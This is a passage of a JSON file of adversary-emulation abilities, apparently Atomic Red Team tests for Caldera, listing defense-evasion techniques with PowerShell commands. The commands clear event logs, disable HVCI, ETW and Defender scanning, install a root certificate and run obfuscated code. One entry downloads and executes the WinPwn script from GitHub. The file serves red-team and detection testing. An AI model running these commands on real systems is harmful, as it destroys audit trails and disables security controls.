        "caldera_ability_id": "68ce066d07960123ccd981dd8c38a7c1"
    },
    "T1218.001__defense-evasion__Signed Binary Proxy Execution: Compiled HTML File__5b1aea789aa50c07bb5555dcff5d42a6": {
        "description": "Executes a CHM file with the ITS protocol handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5b1aea789aa50c07bb5555dcff5d42a6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5b1aea789aa50c07bb5555dcff5d42a6"
    },
    "T1070.001__defense-evasion__Indicator Removal on Host: Clear Windows Event Logs__6fa417fb183d6c20a67e617c0249f04f": {
        "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6fa417fb183d6c20a67e617c0249f04f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6fa417fb183d6c20a67e617c0249f04f"
    },
    "T1070.008__defense-evasion__Email Collection: Mailbox Manipulation__bdc2a80d621d3361ea727008644b1d15": {
        "description": "Copies and modifies mail data on Windows\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.008",
            "name": "Email Collection: Mailbox Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore",
                    "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bdc2a80d621d3361ea727008644b1d15",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bdc2a80d621d3361ea727008644b1d15"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__b97004a5d9c4283b6085ddf3ff0d6b4c": {
        "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f; reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f",
                    "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b97004a5d9c4283b6085ddf3ff0d6b4c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b97004a5d9c4283b6085ddf3ff0d6b4c"
    },
    "T1564.003__defense-evasion__Hide Artifacts: Hidden Window__f1222384fe40cc71e7dea9d182014eaf": {
        "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.003",
            "name": "Hide Artifacts: Hidden Window"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f1222384fe40cc71e7dea9d182014eaf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f1222384fe40cc71e7dea9d182014eaf"
    },
    "T1070.006__defense-evasion__Indicator Removal on Host: Timestomp__08a146a382df6fea9fa2275073e9d245": {
        "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"; timestomp -dest \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "08a146a382df6fea9fa2275073e9d245",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "08a146a382df6fea9fa2275073e9d245"
    },
    "T1562.006__defense-evasion__Impair Defenses: Indicator Blocking__8beb34c915b17873e357c030d517be0a": {
        "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1",
                    "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8beb34c915b17873e357c030d517be0a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8beb34c915b17873e357c030d517be0a"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__89a4fca013d3d39fc4effb1f6c8a8d74": {
        "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug",
                    "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "89a4fca013d3d39fc4effb1f6c8a8d74",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "89a4fca013d3d39fc4effb1f6c8a8d74"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__35200ef3d7ca094ae2208a1df03ede18": {
        "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "35200ef3d7ca094ae2208a1df03ede18",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "35200ef3d7ca094ae2208a1df03ede18"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__ed172018f897dab90147a47995ce197d": {
        "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed172018f897dab90147a47995ce197d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ed172018f897dab90147a47995ce197d"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__e0946bc3b8b888d6c4cdf3f023fe3c0b": {
        "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedExts= \".exe\"; Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore",
                    "command": "$excludedExts= \".exe\"; Add-MpPreference -ExclusionExtension  $excludedExts",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0946bc3b8b888d6c4cdf3f023fe3c0b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e0946bc3b8b888d6c4cdf3f023fe3c0b"
    },
    "T1006__defense-evasion__Direct Volume Access__80e752c5fc69a56ccb86bc90efc5eff6": {
        "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS\n```",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1006",
            "name": "Direct Volume Access"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "80e752c5fc69a56ccb86bc90efc5eff6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "80e752c5fc69a56ccb86bc90efc5eff6"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__5c4ea84c2b050f1f8b6f880755ccbc62": {
        "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedpath= \"C:\\Temp\"; Remove-MpPreference -ExclusionPath $excludedpath",
                    "command": "$excludedpath= \"C:\\Temp\"; Add-MpPreference -ExclusionPath $excludedpath",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5c4ea84c2b050f1f8b6f880755ccbc62",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5c4ea84c2b050f1f8b6f880755ccbc62"
    },
    "T1218.007__defense-evasion__Signed Binary Proxy Execution: Msiexec__a72efdca009d9d28e444240e691a4769": {
        "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a72efdca009d9d28e444240e691a4769",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a72efdca009d9d28e444240e691a4769"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__c407315583b3a00d9a2e0c3c510f2c96": {
        "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$excludedProcess = \"outlook.exe\"; Remove-MpPreference -ExclusionProcess  $excludedProcess",
                    "command": "$excludedProcess = \"outlook.exe\"; Add-MpPreference -ExclusionProcess $excludedProcess",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c407315583b3a00d9a2e0c3c510f2c96",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c407315583b3a00d9a2e0c3c510f2c96"
    },
    "T1112__defense-evasion__Modify Registry__0424ccb447bfa66b94162266f55ecd52": {
        "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {}",
                    "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0424ccb447bfa66b94162266f55ecd52",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0424ccb447bfa66b94162266f55ecd52"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__cb6e6c7e18aba2207c696368f8edb23a": {
        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cb6e6c7e18aba2207c696368f8edb23a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cb6e6c7e18aba2207c696368f8edb23a"
    },
    "T1562.008__defense-evasion__Impair Defenses: Disable Cloud Logs__100ab97404481eade26a4346edd80d73": {
        "description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.008",
            "name": "Impair Defenses: Disable Cloud Logs"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $false; Disconnect-ExchangeOnline -Confirm:$false",
                    "command": "$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $true",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "100ab97404481eade26a4346edd80d73",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "100ab97404481eade26a4346edd80d73"
    },
    "T1036.005__defense-evasion__Masquerading: Match Legitimate Name or Location__029770bd7c3a403daeab3af692af0046": {
        "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.005",
            "name": "Masquerading: Match Legitimate Name or Location"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$Env:windir\\Temp\\svchost.exe\" -ErrorAction Ignore",
                    "command": "Add-Type -TypeDefinition @'; public class Test {;     public static void Main(string[] args) {;         System.Console.WriteLine(\"tweet, tweet\");     }; }; '@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"; Start-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "029770bd7c3a403daeab3af692af0046",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "029770bd7c3a403daeab3af692af0046"
    },
    "T1218.001__defense-evasion__Signed Binary Proxy Execution: Compiled HTML File__4c378a952a9235b7aba7f273f3cf4874": {
        "description": "Executes a CHM file simulating a user double click.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4c378a952a9235b7aba7f273f3cf4874",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4c378a952a9235b7aba7f273f3cf4874"
    },
    "T1218.001__defense-evasion__Signed Binary Proxy Execution: Compiled HTML File__ae1510936a20ac31014eb86e5b4944ce": {
        "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae1510936a20ac31014eb86e5b4944ce",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ae1510936a20ac31014eb86e5b4944ce"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__d5bb3cda05ddba230c90c1afb2640379": {
        "description": "Kill the event log services for stealth via function of WinPwn",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d5bb3cda05ddba230c90c1afb2640379",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d5bb3cda05ddba230c90c1afb2640379"
    },
    "T1553.004__defense-evasion__Subvert Trust Controls: Install Root Certificate__51ddafefb92c9dfcb6ce3369e7316bf3": {
        "description": "Creates a root CA with Powershell\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {;    $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }",
                    "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "51ddafefb92c9dfcb6ce3369e7316bf3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "51ddafefb92c9dfcb6ce3369e7316bf3"
    },
    "T1218__defense-evasion__Signed Binary Proxy Execution__085858a8aa5ea8e6a810e59c75ea7f6a": {
        "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
